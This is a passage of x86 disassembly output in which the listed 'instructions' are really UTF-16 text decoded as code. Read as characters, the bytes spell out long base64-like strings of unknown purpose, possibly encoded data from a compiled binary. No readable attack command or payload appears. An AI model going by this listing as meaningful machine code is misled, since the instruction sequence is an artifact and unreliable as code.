  40abf8:	2b 00                	sub    (%eax),%eax
  40abfa:	54                   	push   %esp
  40abfb:	00 7a 00             	add    %bh,0x0(%edx)
  40abfe:	39 00                	cmp    %eax,(%eax)
  40ac00:	77 00                	ja     0x40ac02
  40ac02:	65 00 7a 00          	add    %bh,%gs:0x0(%edx)
  40ac06:	75 00                	jne    0x40ac08
  40ac08:	66 00 4b 00          	data16 add %cl,0x0(%ebx)
  40ac0c:	71 00                	jno    0x40ac0e
  40ac0e:	48                   	dec    %eax
  40ac0f:	00 71 00             	add    %dh,0x0(%ecx)
  40ac12:	78 00                	js     0x40ac14
  40ac14:	37                   	aaa
  40ac15:	00 6a 00             	add    %ch,0x0(%edx)
  40ac18:	30 00                	xor    %al,(%eax)
  40ac1a:	39 00                	cmp    %eax,(%eax)
  40ac1c:	49                   	dec    %ecx
  40ac1d:	00 4b 00             	add    %cl,0x0(%ebx)
  40ac20:	43                   	inc    %ebx
  40ac21:	00 52 00             	add    %dl,0x0(%edx)
  40ac24:	74 00                	je     0x40ac26
  40ac26:	79 00                	jns    0x40ac28
  40ac28:	4b                   	dec    %ebx
  40ac29:	00 5a 00             	add    %bl,0x0(%edx)
  40ac2c:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac2d:	00 31                	add    %dh,(%ecx)
  40ac2f:	00 37                	add    %dh,(%edi)
  40ac31:	00 64 00 44          	add    %ah,0x44(%eax,%eax,1)
  40ac35:	00 70 00             	add    %dh,0x0(%eax)
  40ac38:	61                   	popa
  40ac39:	00 39                	add    %bh,(%ecx)
  40ac3b:	00 61 00             	add    %ah,0x0(%ecx)
  40ac3e:	48                   	dec    %eax
  40ac3f:	00 36                	add    %dh,(%esi)
  40ac41:	00 50 00             	add    %dl,0x0(%eax)
  40ac44:	55                   	push   %ebp
  40ac45:	00 73 00             	add    %dh,0x0(%ebx)
  40ac48:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  40ac4c:	38 00                	cmp    %al,(%eax)
  40ac4e:	46                   	inc    %esi
  40ac4f:	00 6a 00             	add    %ch,0x0(%edx)
  40ac52:	76 00                	jbe    0x40ac54
  40ac54:	43                   	inc    %ebx
  40ac55:	00 2f                	add    %ch,(%edi)
  40ac57:	00 5a 00             	add    %bl,0x0(%edx)
  40ac5a:	42                   	inc    %edx
  40ac5b:	00 69 00             	add    %ch,0x0(%ecx)
  40ac5e:	78 00                	js     0x40ac60
  40ac60:	4f                   	dec    %edi
  40ac61:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac64:	4b                   	dec    %ebx
  40ac65:	00 2b                	add    %ch,(%ebx)
  40ac67:	00 71 00             	add    %dh,0x0(%ecx)
  40ac6a:	52                   	push   %edx
  40ac6b:	00 58 00             	add    %bl,0x0(%eax)
  40ac6e:	6b 00 6d             	imul   $0x6d,(%eax),%eax
  40ac71:	00 43 00             	add    %al,0x0(%ebx)
  40ac74:	4d                   	dec    %ebp
  40ac75:	00 6b 00             	add    %ch,0x0(%ebx)
  40ac78:	79 00                	jns    0x40ac7a
  40ac7a:	76 00                	jbe    0x40ac7c
  40ac7c:	42                   	inc    %edx
  40ac7d:	00 65 00             	add    %ah,0x0(%ebp)
  40ac80:	30 00                	xor    %al,(%eax)
  40ac82:	76 00                	jbe    0x40ac84
  40ac84:	37                   	aaa
  40ac85:	00 78 00             	add    %bh,0x0(%eax)
  40ac88:	72 00                	jb     0x40ac8a
  40ac8a:	66 00 6c 00 4d       	data16 add %ch,0x4d(%eax,%eax,1)
  40ac8f:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac92:	37                   	aaa
  40ac93:	00 41 00             	add    %al,0x0(%ecx)
  40ac96:	36 00 46 00          	add    %al,%ss:0x0(%esi)
  40ac9a:	71 00                	jno    0x40ac9c
  40ac9c:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
  40aca0:	39 00                	cmp    %eax,(%eax)
  40aca2:	48                   	dec    %eax
  40aca3:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aca6:	74 00                	je     0x40aca8
  40aca8:	36 00 37             	add    %dh,%ss:(%edi)
  40acab:	00 5a 00             	add    %bl,0x0(%edx)
  40acae:	56                   	push   %esi
  40acaf:	00 72 00             	add    %dh,0x0(%edx)
  40acb2:	4b                   	dec    %ebx
  40acb3:	00 61 00             	add    %ah,0x0(%ecx)
  40acb6:	6c                   	insb   (%dx),%es:(%edi)
  40acb7:	00 44 00 74          	add    %al,0x74(%eax,%eax,1)
  40acbb:	00 33                	add    %dh,(%ebx)
  40acbd:	00 4a 00             	add    %cl,0x0(%edx)
  40acc0:	38 00                	cmp    %al,(%eax)
  40acc2:	4d                   	dec    %ebp
  40acc3:	00 57 00             	add    %dl,0x0(%edi)
  40acc6:	61                   	popa
  40acc7:	00 4f 00             	add    %cl,0x0(%edi)
  40acca:	61                   	popa
  40accb:	00 4f 00             	add    %cl,0x0(%edi)
  40acce:	71 00                	jno    0x40acd0
  40acd0:	43                   	inc    %ebx
  40acd1:	00 74 00 37          	add    %dh,0x37(%eax,%eax,1)
  40acd5:	00 51 00             	add    %dl,0x0(%ecx)
  40acd8:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  40acdc:	59                   	pop    %ecx
  40acdd:	00 75 00             	add    %dh,0x0(%ebp)
  40ace0:	57                   	push   %edi
  40ace1:	00 74 00 42          	add    %dh,0x42(%eax,%eax,1)
  40ace5:	00 65 00             	add    %ah,0x0(%ebp)
  40ace8:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  40acec:	6d                   	insl   (%dx),%es:(%edi)
  40aced:	00 35 00 59 00 3d    	add    %dh,0x3d005900
  40acf3:	00 00                	add    %al,(%eax)
  40acf5:	87 b1 77 00 44 00    	xchg   %esi,0x440077(%ecx)
  40acfb:	54                   	push   %esp
  40acfc:	00 63 00             	add    %ah,0x0(%ebx)
  40acff:	56                   	push   %esi
  40ad00:	00 41 00             	add    %al,0x0(%ecx)
  40ad03:	32 00                	xor    (%eax),%al
  40ad05:	33 00                	xor    (%eax),%eax
  40ad07:	59                   	pop    %ecx
  40ad08:	00 4c 00 75          	add    %cl,0x75(%eax,%eax,1)
  40ad0c:	00 52 00             	add    %dl,0x0(%edx)
  40ad0f:	71 00                	jno    0x40ad11
  40ad11:	51                   	push   %ecx
  40ad12:	00 39                	add    %bh,(%ecx)
  40ad14:	00 66 00             	add    %ah,0x0(%esi)
  40ad17:	6b 00 76             	imul   $0x76,(%eax),%eax
  40ad1a:	00 65 00             	add    %ah,0x0(%ebp)
  40ad1d:	2f                   	das
  40ad1e:	00 2f                	add    %ch,(%edi)
  40ad20:	00 31                	add    %dh,(%ecx)
  40ad22:	00 57 00             	add    %dl,0x0(%edi)
  40ad25:	6d                   	insl   (%dx),%es:(%edi)
  40ad26:	00 43 00             	add    %al,0x0(%ebx)
  40ad29:	70 00                	jo     0x40ad2b
  40ad2b:	4e                   	dec    %esi
  40ad2c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ad2f:	38 00                	cmp    %al,(%eax)
  40ad31:	53                   	push   %ebx
  40ad32:	00 4e 00             	add    %cl,0x0(%esi)
  40ad35:	2f                   	das
  40ad36:	00 65 00             	add    %ah,0x0(%ebp)
  40ad39:	34 00                	xor    $0x0,%al
  40ad3b:	51                   	push   %ecx
  40ad3c:	00 6c 00 55          	add    %ch,0x55(%eax,%eax,1)
  40ad40:	00 39                	add    %bh,(%ecx)
  40ad42:	00 46 00             	add    %al,0x0(%esi)
  40ad45:	5a                   	pop    %edx
  40ad46:	00 37                	add    %dh,(%edi)
  40ad48:	00 53 00             	add    %dl,0x0(%ebx)
  40ad4b:	53                   	push   %ebx
  40ad4c:	00 42 00             	add    %al,0x0(%edx)
  40ad4f:	4b                   	dec    %ebx
  40ad50:	00 41 00             	add    %al,0x0(%ecx)
  40ad53:	67 00 63 00          	add    %ah,0x0(%bp,%di)
  40ad57:	71 00                	jno    0x40ad59
  40ad59:	56                   	push   %esi
  40ad5a:	00 59 00             	add    %bl,0x0(%ecx)
  40ad5d:	44                   	inc    %esp
  40ad5e:	00 56 00             	add    %dl,0x0(%esi)
  40ad61:	36 00 6c 00 74       	add    %ch,%ss:0x74(%eax,%eax,1)
  40ad66:	00 6e 00             	add    %ch,0x0(%esi)
  40ad69:	46                   	inc    %esi
  40ad6a:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
  40ad6e:	00 4a 00             	add    %cl,0x0(%edx)
  40ad71:	61                   	popa
  40ad72:	00 2b                	add    %ch,(%ebx)
  40ad74:	00 33                	add    %dh,(%ebx)
  40ad76:	00 59 00             	add    %bl,0x0(%ecx)
  40ad79:	37                   	aaa
  40ad7a:	00 6b 00             	add    %ch,0x0(%ebx)
  40ad7d:	4e                   	dec    %esi
  40ad7e:	00 30                	add    %dh,(%eax)
  40ad80:	00 37                	add    %dh,(%edi)
  40ad82:	00 76 00             	add    %dh,0x0(%esi)
  40ad85:	48                   	dec    %eax
  40ad86:	00 79 00             	add    %bh,0x0(%ecx)
  40ad89:	4a                   	dec    %edx
  40ad8a:	00 75 00             	add    %dh,0x0(%ebp)
  40ad8d:	5a                   	pop    %edx
  40ad8e:	00 65 00             	add    %ah,0x0(%ebp)
  40ad91:	39 00                	cmp    %eax,(%eax)
  40ad93:	46                   	inc    %esi
  40ad94:	00 45 00             	add    %al,0x0(%ebp)
  40ad97:	5a                   	pop    %edx
  40ad98:	00 45 00             	add    %al,0x0(%ebp)
  40ad9b:	5a                   	pop    %edx
  40ad9c:	00 41 00             	add    %al,0x0(%ecx)
  40ad9f:	65 00 2f             	add    %ch,%gs:(%edi)
  40ada2:	00 2f                	add    %ch,(%edi)
  40ada4:	00 55 00             	add    %dl,0x0(%ebp)
  40ada7:	70 00                	jo     0x40ada9
  40ada9:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
  40adad:	6e                   	outsb  %ds:(%esi),(%dx)
  40adae:	00 47 00             	add    %al,0x0(%edi)
  40adb1:	37                   	aaa
  40adb2:	00 68 00             	add    %ch,0x0(%eax)
  40adb5:	58                   	pop    %eax
  40adb6:	00 4a 00             	add    %cl,0x0(%edx)
  40adb9:	51                   	push   %ecx
  40adba:	00 4d 00             	add    %cl,0x0(%ebp)
  40adbd:	51                   	push   %ecx
  40adbe:	00 77 00             	add    %dh,0x0(%edi)
  40adc1:	55                   	push   %ebp
  40adc2:	00 2f                	add    %ch,(%edi)
  40adc4:	00 49 00             	add    %cl,0x0(%ecx)
  40adc7:	51                   	push   %ecx
  40adc8:	00 70 00             	add    %dh,0x0(%eax)
  40adcb:	54                   	push   %esp
  40adcc:	00 61 00             	add    %ah,0x0(%ecx)
  40adcf:	37                   	aaa
  40add0:	00 4e 00             	add    %cl,0x0(%esi)
  40add3:	4c                   	dec    %esp
  40add4:	00 55 00             	add    %dl,0x0(%ebp)
  40add7:	52                   	push   %edx
  40add8:	00 2b                	add    %ch,(%ebx)
  40adda:	00 36                	add    %dh,(%esi)
  40addc:	00 66 00             	add    %ah,0x0(%esi)
  40addf:	6e                   	outsb  %ds:(%esi),(%dx)
  40ade0:	00 37                	add    %dh,(%edi)
  40ade2:	00 65 00             	add    %ah,0x0(%ebp)
  40ade5:	32 00                	xor    (%eax),%al
  40ade7:	4a                   	dec    %edx
  40ade8:	00 63 00             	add    %ah,0x0(%ebx)
  40adeb:	6a 00                	push   $0x0
  40aded:	2b 00                	sub    (%eax),%eax
  40adef:	49                   	dec    %ecx
  40adf0:	00 69 00             	add    %ch,0x0(%ecx)
  40adf3:	4a                   	dec    %edx
  40adf4:	00 48 00             	add    %cl,0x0(%eax)
  40adf7:	30 00                	xor    %al,(%eax)
  40adf9:	78 00                	js     0x40adfb
  40adfb:	47                   	inc    %edi
  40adfc:	00 48 00             	add    %cl,0x0(%eax)
  40adff:	7a 00                	jp     0x40ae01
  40ae01:	4b                   	dec    %ebx
  40ae02:	00 65 00             	add    %ah,0x0(%ebp)
  40ae05:	68 00 53 00 76       	push   $0x76005300
  40ae0a:	00 71 00             	add    %dh,0x0(%ecx)
  40ae0d:	53                   	push   %ebx
  40ae0e:	00 73 00             	add    %dh,0x0(%ebx)
  40ae11:	4e                   	dec    %esi
  40ae12:	00 48 00             	add    %cl,0x0(%eax)
  40ae15:	4e                   	dec    %esi
  40ae16:	00 49 00             	add    %cl,0x0(%ecx)
  40ae19:	42                   	inc    %edx
  40ae1a:	00 6b 00             	add    %ch,0x0(%ebx)
  40ae1d:	44                   	inc    %esp
  40ae1e:	00 6d 00             	add    %ch,0x0(%ebp)
  40ae21:	66 00 63 00          	data16 add %ah,0x0(%ebx)
  40ae25:	4c                   	dec    %esp
  40ae26:	00 4b 00             	add    %cl,0x0(%ebx)
  40ae29:	46                   	inc    %esi
  40ae2a:	00 69 00             	add    %ch,0x0(%ecx)
  40ae2d:	4e                   	dec    %esi
  40ae2e:	00 30                	add    %dh,(%eax)
  40ae30:	00 59 00             	add    %bl,0x0(%ecx)
  40ae33:	67 00 74 00          	add    %dh,0x0(%si)
  40ae37:	37                   	aaa
  40ae38:	00 76 00             	add    %dh,0x0(%esi)
  40ae3b:	78 00                	js     0x40ae3d
  40ae3d:	2f                   	das
  40ae3e:	00 49 00             	add    %cl,0x0(%ecx)
  40ae41:	77 00                	ja     0x40ae43
  40ae43:	49                   	dec    %ecx
  40ae44:	00 78 00             	add    %bh,0x0(%eax)
  40ae47:	42                   	inc    %edx
  40ae48:	00 61 00             	add    %ah,0x0(%ecx)
  40ae4b:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae4c:	00 6d 00             	add    %ch,0x0(%ebp)
  40ae4f:	6d                   	insl   (%dx),%es:(%edi)
  40ae50:	00 4b 00             	add    %cl,0x0(%ebx)
  40ae53:	57                   	push   %edi
  40ae54:	00 33                	add    %dh,(%ebx)
  40ae56:	00 42 00             	add    %al,0x0(%edx)
  40ae59:	39 00                	cmp    %eax,(%eax)
  40ae5b:	44                   	inc    %esp
  40ae5c:	00 71 00             	add    %dh,0x0(%ecx)
  40ae5f:	44                   	inc    %esp
  40ae60:	00 4f 00             	add    %cl,0x0(%edi)
  40ae63:	75 00                	jne    0x40ae65
  40ae65:	50                   	push   %eax
  40ae66:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae69:	56                   	push   %esi
  40ae6a:	00 66 00             	add    %ah,0x0(%esi)
  40ae6d:	56                   	push   %esi
  40ae6e:	00 75 00             	add    %dh,0x0(%ebp)
  40ae71:	73 00                	jae    0x40ae73
  40ae73:	52                   	push   %edx
  40ae74:	00 58 00             	add    %bl,0x0(%eax)
  40ae77:	63 00                	arpl   %eax,(%eax)
  40ae79:	65 00 4e 00          	add    %cl,%gs:0x0(%esi)
  40ae7d:	64 00 6c 00 4b       	add    %ch,%fs:0x4b(%eax,%eax,1)
  40ae82:	00 77 00             	add    %dh,0x0(%edi)
  40ae85:	33 00                	xor    (%eax),%eax
  40ae87:	67 00 41 00          	add    %al,0x0(%bx,%di)
  40ae8b:	44                   	inc    %esp
  40ae8c:	00 64 00 4b          	add    %ah,0x4b(%eax,%eax,1)
  40ae90:	00 67 00             	add    %ah,0x0(%edi)
  40ae93:	35 00 44 00 4d       	xor    $0x4d004400,%eax
  40ae98:	00 2b                	add    %ch,(%ebx)
  40ae9a:	00 70 00             	add    %dh,0x0(%eax)
  40ae9d:	49                   	dec    %ecx
  40ae9e:	00 58 00             	add    %bl,0x0(%eax)
  40aea1:	42                   	inc    %edx
  40aea2:	00 73 00             	add    %dh,0x0(%ebx)
  40aea5:	76 00                	jbe    0x40aea7
  40aea7:	35 00 65 00 2f       	xor    $0x2f006500,%eax
  40aeac:	00 54 00 36          	add    %dl,0x36(%eax,%eax,1)
  40aeb0:	00 71 00             	add    %dh,0x0(%ecx)
  40aeb3:	33 00                	xor    (%eax),%eax
  40aeb5:	77 00                	ja     0x40aeb7
  40aeb7:	6c                   	insb   (%dx),%es:(%edi)
  40aeb8:	00 53 00             	add    %dl,0x0(%ebx)
  40aebb:	4c                   	dec    %esp
  40aebc:	00 4c 00 42          	add    %cl,0x42(%eax,%eax,1)
  40aec0:	00 56 00             	add    %dl,0x0(%esi)
  40aec3:	51                   	push   %ecx
  40aec4:	00 75 00             	add    %dh,0x0(%ebp)
  40aec7:	46                   	inc    %esi
  40aec8:	00 6a 00             	add    %ch,0x0(%edx)
  40aecb:	78 00                	js     0x40aecd
  40aecd:	59                   	pop    %ecx
  40aece:	00 59 00             	add    %bl,0x0(%ecx)
  40aed1:	52                   	push   %edx
  40aed2:	00 49 00             	add    %cl,0x0(%ecx)
  40aed5:	76 00                	jbe    0x40aed7
  40aed7:	78 00                	js     0x40aed9
  40aed9:	4b                   	dec    %ebx
  40aeda:	00 6c 00 44          	add    %ch,0x44(%eax,%eax,1)
  40aede:	00 7a 00             	add    %bh,0x0(%edx)
  40aee1:	4f                   	dec    %edi
  40aee2:	00 2b                	add    %ch,(%ebx)
  40aee4:	00 57 00             	add    %dl,0x0(%edi)
  40aee7:	55                   	push   %ebp
  40aee8:	00 56 00             	add    %dl,0x0(%esi)
  40aeeb:	39 00                	cmp    %eax,(%eax)
  40aeed:	4a                   	dec    %edx
  40aeee:	00 50 00             	add    %dl,0x0(%eax)
  40aef1:	33 00                	xor    (%eax),%eax
  40aef3:	61                   	popa
  40aef4:	00 36                	add    %dh,(%esi)
  40aef6:	00 7a 00             	add    %bh,0x0(%edx)
  40aef9:	45                   	inc    %ebp
  40aefa:	00 50 00             	add    %dl,0x0(%eax)
  40aefd:	61                   	popa
  40aefe:	00 47 00             	add    %al,0x0(%edi)
  40af01:	30 00                	xor    %al,(%eax)
  40af03:	38 00                	cmp    %al,(%eax)
  40af05:	33 00                	xor    (%eax),%eax
  40af07:	30 00                	xor    %al,(%eax)
  40af09:	77 00                	ja     0x40af0b
  40af0b:	53                   	push   %ebx
  40af0c:	00 49 00             	add    %cl,0x0(%ecx)
  40af0f:	78 00                	js     0x40af11
  40af11:	6c                   	insb   (%dx),%es:(%edi)
  40af12:	00 6e 00             	add    %ch,0x0(%esi)
  40af15:	6a 00                	push   $0x0
  40af17:	37                   	aaa
  40af18:	00 30                	add    %dh,(%eax)
  40af1a:	00 44 00 76          	add    %al,0x76(%eax,%eax,1)
  40af1e:	00 73 00             	add    %dh,0x0(%ebx)
  40af21:	6c                   	insb   (%dx),%es:(%edi)
  40af22:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40af26:	00 7a 00             	add    %bh,0x0(%edx)
  40af29:	4d                   	dec    %ebp
  40af2a:	00 42 00             	add    %al,0x0(%edx)
  40af2d:	54                   	push   %esp
  40af2e:	00 63 00             	add    %ah,0x0(%ebx)
  40af31:	4e                   	dec    %esi
  40af32:	00 34 00             	add    %dh,(%eax,%eax,1)
  40af35:	4c                   	dec    %esp
  40af36:	00 38                	add    %bh,(%eax)
  40af38:	00 6e 00             	add    %ch,0x0(%esi)
  40af3b:	41                   	inc    %ecx
  40af3c:	00 35 00 39 00 62    	add    %dh,0x62003900
  40af42:	00 49 00             	add    %cl,0x0(%ecx)
  40af45:	31 00                	xor    %eax,(%eax)
  40af47:	69 00 64 00 68 00    	imul   $0x680064,(%eax),%eax
  40af4d:	4f                   	dec    %edi
  40af4e:	00 4f 00             	add    %cl,0x0(%edi)
  40af51:	38 00                	cmp    %al,(%eax)
  40af53:	6d                   	insl   (%dx),%es:(%edi)
  40af54:	00 6b 00             	add    %ch,0x0(%ebx)
  40af57:	46                   	inc    %esi
  40af58:	00 31                	add    %dh,(%ecx)
  40af5a:	00 6f 00             	add    %ch,0x0(%edi)
  40af5d:	62 00                	bound  %eax,(%eax)
  40af5f:	61                   	popa
  40af60:	00 4c 00 6b          	add    %cl,0x6b(%eax,%eax,1)
  40af64:	00 42 00             	add    %al,0x0(%edx)
  40af67:	74 00                	je     0x40af69
  40af69:	51                   	push   %ecx
  40af6a:	00 38                	add    %bh,(%eax)
  40af6c:	00 6b 00             	add    %ch,0x0(%ebx)
  40af6f:	51                   	push   %ecx
  40af70:	00 2b                	add    %ch,(%ebx)
  40af72:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40af76:	00 39                	add    %bh,(%ecx)
  40af78:	00 71 00             	add    %dh,0x0(%ecx)
  40af7b:	52                   	push   %edx
  40af7c:	00 4e 00             	add    %cl,0x0(%esi)
  40af7f:	55                   	push   %ebp
  40af80:	00 45 00             	add    %al,0x0(%ebp)
  40af83:	5a                   	pop    %edx
  40af84:	00 41 00             	add    %al,0x0(%ecx)
  40af87:	47                   	inc    %edi
  40af88:	00 77 00             	add    %dh,0x0(%edi)
  40af8b:	41                   	inc    %ecx
  40af8c:	00 30                	add    %dh,(%eax)
  40af8e:	00 65 00             	add    %ah,0x0(%ebp)
  40af91:	2b 00                	sub    (%eax),%eax
  40af93:	32 00                	xor    (%eax),%al
  40af95:	4d                   	dec    %ebp
  40af96:	00 78 00             	add    %bh,0x0(%eax)
  40af99:	57                   	push   %edi
  40af9a:	00 56 00             	add    %dl,0x0(%esi)
  40af9d:	6d                   	insl   (%dx),%es:(%edi)
  40af9e:	00 57 00             	add    %dl,0x0(%edi)
  40afa1:	4e                   	dec    %esi
  40afa2:	00 56 00             	add    %dl,0x0(%esi)
  40afa5:	4b                   	dec    %ebx
  40afa6:	00 61 00             	add    %ah,0x0(%ecx)
  40afa9:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  40afad:	61                   	popa
  40afae:	00 34 00             	add    %dh,(%eax,%eax,1)
  40afb1:	72 00                	jb     0x40afb3
  40afb3:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
  40afb7:	46                   	inc    %esi
  40afb8:	00 47 00             	add    %al,0x0(%edi)
  40afbb:	37                   	aaa
  40afbc:	00 4d 00             	add    %cl,0x0(%ebp)
  40afbf:	6b 00 38             	imul   $0x38,(%eax),%eax
  40afc2:	00 6f 00             	add    %ch,0x0(%edi)
  40afc5:	59                   	pop    %ecx
  40afc6:	00 5a 00             	add    %bl,0x0(%edx)
  40afc9:	46                   	inc    %esi
  40afca:	00 75 00             	add    %dh,0x0(%ebp)
  40afcd:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  40afd1:	43                   	inc    %ebx
  40afd2:	00 37                	add    %dh,(%edi)
  40afd4:	00 4c 00 4d          	add    %cl,0x4d(%eax,%eax,1)
  40afd8:	00 77 00             	add    %dh,0x0(%edi)
  40afdb:	62 00                	bound  %eax,(%eax)
  40afdd:	4f                   	dec    %edi
  40afde:	00 66 00             	add    %ah,0x0(%esi)
  40afe1:	33 00                	xor    (%eax),%eax
  40afe3:	77 00                	ja     0x40afe5
  40afe5:	37                   	aaa
  40afe6:	00 77 00             	add    %dh,0x0(%edi)
  40afe9:	4f                   	dec    %edi
  40afea:	00 32                	add    %dh,(%edx)
  40afec:	00 6c 00 35          	add    %ch,0x35(%eax,%eax,1)
  40aff0:	00 32                	add    %dh,(%edx)
  40aff2:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aff5:	79 00                	jns    0x40aff7
  40aff7:	2b 00                	sub    (%eax),%eax
  40aff9:	4d                   	dec    %ebp
  40affa:	00 31                	add    %dh,(%ecx)
  40affc:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  40b000:	00 66 00             	add    %ah,0x0(%esi)
  40b003:	47                   	inc    %edi
  40b004:	00 69 00             	add    %ch,0x0(%ecx)
  40b007:	35 00 66 00 66       	xor    $0x66006600,%eax
  40b00c:	00 62 00             	add    %ah,0x0(%edx)
  40b00f:	36 00 75 00          	add    %dh,%ss:0x0(%ebp)
  40b013:	56                   	push   %esi
  40b014:	00 76 00             	add    %dh,0x0(%esi)
  40b017:	53                   	push   %ebx
  40b018:	00 6d 00             	add    %ch,0x0(%ebp)
  40b01b:	65 00 74 00 34       	add    %dh,%gs:0x34(%eax,%eax,1)
  40b020:	00 31                	add    %dh,(%ecx)
  40b022:	00 36                	add    %dh,(%esi)
  40b024:	00 74 00 7a          	add    %dh,0x7a(%eax,%eax,1)
  40b028:	00 7a 00             	add    %bh,0x0(%edx)
  40b02b:	55                   	push   %ebp
  40b02c:	00 67 00             	add    %ah,0x0(%edi)
  40b02f:	62 00                	bound  %eax,(%eax)
  40b031:	6c                   	insb   (%dx),%es:(%edi)
  40b032:	00 6a 00             	add    %ch,0x0(%edx)
  40b035:	57                   	push   %edi
  40b036:	00 43 00             	add    %al,0x0(%ebx)
  40b039:	35 00 6c 00 4a       	xor    $0x4a006c00,%eax
  40b03e:	00 32                	add    %dh,(%edx)
  40b040:	00 43 00             	add    %al,0x0(%ebx)
  40b043:	32 00                	xor    (%eax),%al
  40b045:	31 00                	xor    %eax,(%eax)
  40b047:	2b 00                	sub    (%eax),%eax
  40b049:	4a                   	dec    %edx
  40b04a:	00 37                	add    %dh,(%edi)
  40b04c:	00 6b 00             	add    %ch,0x0(%ebx)
  40b04f:	4a                   	dec    %edx
  40b050:	00 62 00             	add    %ah,0x0(%edx)
  40b053:	49                   	dec    %ecx
  40b054:	00 32                	add    %dh,(%edx)
  40b056:	00 6d 00             	add    %ch,0x0(%ebp)
  40b059:	6b 00 50             	imul   $0x50,(%eax),%eax
  40b05c:	00 2b                	add    %ch,(%ebx)
  40b05e:	00 61 00             	add    %ah,0x0(%ecx)
  40b061:	38 00                	cmp    %al,(%eax)
  40b063:	67 00 6e 00          	add    %ch,0x0(%bp)
  40b067:	74 00                	je     0x40b069
  40b069:	30 00                	xor    %al,(%eax)
  40b06b:	47                   	inc    %edi
  40b06c:	00 36                	add    %dh,(%esi)
  40b06e:	00 2b                	add    %ch,(%ebx)
  40b070:	00 37                	add    %dh,(%edi)
  40b072:	00 63 00             	add    %ah,0x0(%ebx)
  40b075:	4e                   	dec    %esi
  40b076:	00 4b 00             	add    %cl,0x0(%ebx)
  40b079:	32 00                	xor    (%eax),%al
  40b07b:	34 00                	xor    $0x0,%al
  40b07d:	52                   	push   %edx
  40b07e:	00 72 00             	add    %dh,0x0(%edx)
  40b081:	51                   	push   %ecx
  40b082:	00 51 00             	add    %dl,0x0(%ecx)
  40b085:	79 00                	jns    0x40b087
  40b087:	58                   	pop    %eax
  40b088:	00 37                	add    %dh,(%edi)
  40b08a:	00 38                	add    %bh,(%eax)
  40b08c:	00 49 00             	add    %cl,0x0(%ecx)
  40b08f:	78 00                	js     0x40b091
  40b091:	74 00                	je     0x40b093
  40b093:	66 00 31             	data16 add %dh,(%ecx)
  40b096:	00 6a 00             	add    %ch,0x0(%edx)
  40b099:	50                   	push   %eax
  40b09a:	00 68 00             	add    %ch,0x0(%eax)
  40b09d:	53                   	push   %ebx
  40b09e:	00 4f 00             	add    %cl,0x0(%edi)
  40b0a1:	73 00                	jae    0x40b0a3
  40b0a3:	4d                   	dec    %ebp
  40b0a4:	00 42 00             	add    %al,0x0(%edx)
  40b0a7:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40b0ab:	74 00                	je     0x40b0ad
  40b0ad:	47                   	inc    %edi
  40b0ae:	00 75 00             	add    %dh,0x0(%ebp)
  40b0b1:	30 00                	xor    %al,(%eax)
  40b0b3:	78 00                	js     0x40b0b5
  40b0b5:	47                   	inc    %edi
  40b0b6:	00 5a 00             	add    %bl,0x0(%edx)
  40b0b9:	56                   	push   %esi
  40b0ba:	00 66 00             	add    %ah,0x0(%esi)
  40b0bd:	70 00                	jo     0x40b0bf
  40b0bf:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0c0:	00 76 00             	add    %dh,0x0(%esi)
  40b0c3:	62 00                	bound  %eax,(%eax)
  40b0c5:	51                   	push   %ecx
  40b0c6:	00 32                	add    %dh,(%edx)
  40b0c8:	00 55 00             	add    %dl,0x0(%ebp)
  40b0cb:	5a                   	pop    %edx
  40b0cc:	00 4d 00             	add    %cl,0x0(%ebp)
  40b0cf:	75 00                	jne    0x40b0d1
  40b0d1:	70 00                	jo     0x40b0d3
  40b0d3:	41                   	inc    %ecx
  40b0d4:	00 2f                	add    %ch,(%edi)
  40b0d6:	00 4d 00             	add    %cl,0x0(%ebp)
  40b0d9:	43                   	inc    %ebx
  40b0da:	00 78 00             	add    %bh,0x0(%eax)
  40b0dd:	46                   	inc    %esi
  40b0de:	00 65 00             	add    %ah,0x0(%ebp)
  40b0e1:	61                   	popa
  40b0e2:	00 35 00 4f 00 64    	add    %dh,0x64004f00
  40b0e8:	00 73 00             	add    %dh,0x0(%ebx)
  40b0eb:	56                   	push   %esi
  40b0ec:	00 59 00             	add    %bl,0x0(%ecx)
  40b0ef:	79 00                	jns    0x40b0f1
  40b0f1:	66 00 41 00          	data16 add %al,0x0(%ecx)
  40b0f5:	74 00                	je     0x40b0f7
  40b0f7:	51                   	push   %ecx
  40b0f8:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
  40b0fc:	00 42 00             	add    %al,0x0(%edx)
  40b0ff:	45                   	inc    %ebp
  40b100:	00 71 00             	add    %dh,0x0(%ecx)
  40b103:	35 00 61 00 44       	xor    $0x44006100,%eax
  40b108:	00 53 00             	add    %dl,0x0(%ebx)
  40b10b:	2b 00                	sub    (%eax),%eax
  40b10d:	39 00                	cmp    %eax,(%eax)
  40b10f:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40b113:	65 00 46 00          	add    %al,%gs:0x0(%esi)
  40b117:	63 00                	arpl   %eax,(%eax)
  40b119:	61                   	popa
  40b11a:	00 33                	add    %dh,(%ebx)
  40b11c:	00 51 00             	add    %dl,0x0(%ecx)
  40b11f:	38 00                	cmp    %al,(%eax)
  40b121:	51                   	push   %ecx
  40b122:	00 7a 00             	add    %bh,0x0(%edx)
  40b125:	47                   	inc    %edi
  40b126:	00 42 00             	add    %al,0x0(%edx)
  40b129:	2b 00                	sub    (%eax),%eax
  40b12b:	50                   	push   %eax
